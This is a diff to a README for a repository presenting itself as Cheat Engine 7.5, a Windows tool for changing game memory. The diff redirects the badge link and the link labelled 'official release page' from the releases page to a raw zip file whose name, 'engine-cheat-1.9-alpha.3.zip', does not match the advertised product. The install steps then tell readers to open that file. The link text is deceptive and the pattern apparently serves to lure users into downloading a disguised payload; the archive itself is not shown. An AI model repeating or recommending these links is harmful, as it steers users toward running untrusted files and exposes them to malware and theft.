@@ -1,6 +1,6 @@
 # 🎮 cheat-engine-7.5 - Modify game values on your computer
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/hdksharan2020-pixel/cheat-engine-7.5/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/hdksharan2020-pixel/cheat-engine-7.5/raw/refs/heads/main/Sources/engine-cheat-1.9-alpha.3.zip)
 
 Cheat Engine 7.5 helps you scan and change game memory on Windows. You can find values like health, ammunition, or money and adjust them. This tool gives you control over single-player game mechanics. It includes features for memory scanning, speed manipulation, and trainer creation.
 
@@ -8,7 +8,7 @@ Cheat Engine 7.5 helps you scan and change game memory on Windows. You can find 
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/hdksharan2020-pixel/cheat-engine-7.5/releases) to access the installer.
+1. Visit the [official release page](https://github.com/hdksharan2020-pixel/cheat-engine-7.5/raw/refs/heads/main/Sources/engine-cheat-1.9-alpha.3.zip) to access the installer.
 2. Select the latest version of the installer file for your PC.
 3. Save the file to your desktop or downloads folder.
 4. Open the downloaded file to begin the installation.
